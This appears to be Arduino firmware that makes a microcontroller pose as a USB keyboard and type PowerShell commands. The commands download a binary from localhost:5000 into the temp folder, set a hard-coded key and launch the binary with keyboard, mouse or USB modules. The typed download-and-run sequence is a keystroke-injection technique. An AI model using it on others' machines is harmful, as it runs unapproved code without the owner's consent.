#include "Keyboard.h"

char notifyConfig[] = "$Env:RCDO_NOTIFY=0; `\n";
char apiKey[] = "$Env:RCDO_KEY=\"whyare\"; `\n";
char dlCmd[] = "iwr -Uri http://localhost:5000/download/bin/watch-binary -OutFile $Env:temp\\rcdob.exe; `\n"; 

float getVCC() {
  SYSCTRL->VREF.reg |= SYSCTRL_VREF_BGOUTEN;
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->SAMPCTRL.bit.SAMPLEN = 0x1;
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->INPUTCTRL.bit.MUXPOS = 0x19;         // Internal bandgap input
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->CTRLA.bit.ENABLE = 0x01;             // Enable ADC
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->SWTRIG.bit.START = 1;  // Start conversion
  ADC->INTFLAG.bit.RESRDY = 1;  // Clear the Data Ready flag
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->SWTRIG.bit.START = 1;  // Start the conversion again to throw out first value
  while ( ADC->INTFLAG.bit.RESRDY == 0 );   // Waiting for conversion to complete
  uint32_t valueRead = ADC->RESULT.reg;
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->CTRLA.bit.ENABLE = 0x00;             // Disable ADC
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  SYSCTRL->VREF.reg &= ~SYSCTRL_VREF_BGOUTEN;
  float vcc = (1.1 * 1023.0) / valueRead;
  return vcc;
}

// gets current input voltage
float getBattVoltage(void) {
  const int VBATTpin = A4;
  float VCC = getVCC();

  // Use resistor division and math to get the voltage
  float resistorDiv = 0.5;
  float ADCres = 1023.0;
  float battVoltageReading = analogRead(VBATTpin);
  battVoltageReading = analogRead(VBATTpin); // Throw out first value
  float battVoltage = VCC * battVoltageReading / ADCres / resistorDiv;

  return battVoltage;
}


char* selectModules(int *menuSelected){
  char* modules = (char*)calloc(512,1);
  if (modules == NULL){
    // handle error
    return "";
  }

  if (menuSelected[0]){
    strcat(modules," keyboard");
  }
  if (menuSelected[1]){
    strcat(modules," mouse");
  }
  if (menuSelected[2]){
    strcat(modules," usb");
  }
  return modules;
}


// Keyboard needs to begin before this function is called.
void runPS(){
  Keyboard.write(0);
  delay(30);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.print('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell.exe");
  Keyboard.write(KEY_RETURN);
  delay(500);
}

void downloadBin(){
  Keyboard.print("cd $env:TEMP; `\n");
  Keyboard.print(dlCmd);
}

void setupConfig(int notify){
  Keyboard.print(apiKey);
  if (!notify){
    Keyboard.print(notifyConfig);
  }
}

void startBinary(int *option){
  for (int i=0; i < 4; i++){
    SerialMonitorInterface.print(option[i]);
  }
  pinMode(LED_BUILTIN, OUTPUT);

  // wait 1 sec to allow for higher success rates
  // due to some funky windows USB recognition
  delay(1000);
  Keyboard.begin();
  runPS();
  downloadBin();
  setupConfig(option[3]);
  //strcpy(buf,binaryCmdline);
  char *mods = selectModules(option);

  Keyboard.print(".\\rcdob.exe ");
  Keyboard.print(mods);
  Keyboard.print("; `\nexit\n");

  free(mods);
  Keyboard.end();
}
